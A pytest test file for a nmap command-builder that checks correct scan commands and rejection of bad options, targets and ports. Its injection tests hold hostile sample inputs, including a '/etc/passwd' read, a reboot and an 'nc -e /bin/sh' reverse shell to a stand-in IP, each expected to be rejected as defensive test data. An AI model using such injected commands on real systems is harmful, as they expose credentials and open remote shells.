import pytest
from scanner.validators import ValidationError
from scanner.command_builder import (
    NmapCommandBuilder,
    build_host_discovery_command,
    build_port_scan_command,
    build_tcp_scan_command,
    build_udp_scan_command,
    build_icmp_scan_command,
    build_version_detection_command,
    build_os_detection_command,
    build_banner_grabbing_command
)

# 1. Correct Command Construction Tests
def test_tcp_syn_scan_construction():
    cmd = build_tcp_scan_command(target="192.168.1.1", ports="22,80,443", tcp_flag="-sS", timing="-T4")
    assert cmd == ["nmap", "-T4", "-sS", "-p", "22,80,443", "192.168.1.1"]

def test_host_discovery_construction():
    cmd = build_host_discovery_command(target="10.0.0.0/24", options=["-sn", "-PE"])
    assert cmd == ["nmap", "-PE", "-sn", "10.0.0.0/24"]

def test_udp_scan_construction():
    cmd = build_udp_scan_command(target="example.com", ports="53,161")
    assert cmd == ["nmap", "-sU", "-p", "53,161", "example.com"]

def test_version_detection_construction():
    cmd = build_version_detection_command(target="192.168.1.50", ports="80,8080", intensity=5)
    assert cmd == ["nmap", "-sV", "--version-intensity", "5", "-p", "80,8080", "192.168.1.50"]

def test_os_detection_construction():
    cmd = build_os_detection_command(target="192.168.1.1", options=["--osscan-guess"])
    assert cmd == ["nmap", "--osscan-guess", "-O", "192.168.1.1"]

def test_banner_grabbing_construction():
    cmd = build_banner_grabbing_command(target="192.168.1.1", ports="80,443")
    assert cmd == ["nmap", "--script=banner", "-sV", "-p", "80,443", "192.168.1.1"]

# 2. Invalid Option Rejection
def test_invalid_option_rejection():
    with pytest.raises(ValidationError):
        # Arbitrary unlisted Nmap flag should fail
        build_tcp_scan_command(target="192.168.1.1", options=["--script=exploit-vulnerability"])

    with pytest.raises(ValidationError):
        # Flag outside Host Discovery allowlist
        build_host_discovery_command(target="192.168.1.1", options=["-sV"])

# 3. Invalid Target Rejection
def test_invalid_target_rejection():
    with pytest.raises(ValidationError):
        NmapCommandBuilder(target="256.256.256.256")

    with pytest.raises(ValidationError):
        NmapCommandBuilder(target="invalid_hostname_format_!@#$")

# 4. Invalid Port Rejection
def test_invalid_port_rejection():
    with pytest.raises(ValidationError):
        build_tcp_scan_command(target="192.168.1.1", ports="70000")

    with pytest.raises(ValidationError):
        build_tcp_scan_command(target="192.168.1.1", ports="80-70")  # Start > End

# 5. Duplicate Option Handling
def test_duplicate_option_handling():
    builder = NmapCommandBuilder("192.168.1.1")
    builder.add_flags(["-sS", "-sS", "-Pn"])
    cmd = builder.build()
    # Duplicate flags should be deduplicated
    assert cmd.count("-sS") == 1
    assert cmd.count("-Pn") == 1

# 6. Empty Input Tests
def test_empty_input():
    with pytest.raises(ValidationError):
        NmapCommandBuilder(target="")

    with pytest.raises(ValidationError):
        NmapCommandBuilder(target="   ")

# 7. Shell Injection Attempts in Command Builder
def test_shell_injection_prevention():
    injection_targets = [
        "192.168.1.1; cat /etc/passwd",
        "example.com && reboot",
        "127.0.0.1 | nc -e /bin/sh 1.2.3.4 4444",
        "`id`"
    ]
    for target in injection_targets:
        with pytest.raises(ValidationError):
            NmapCommandBuilder(target=target)

def test_shell_injection_in_ports():
    with pytest.raises(ValidationError):
        build_tcp_scan_command(target="192.168.1.1", ports="80; id")
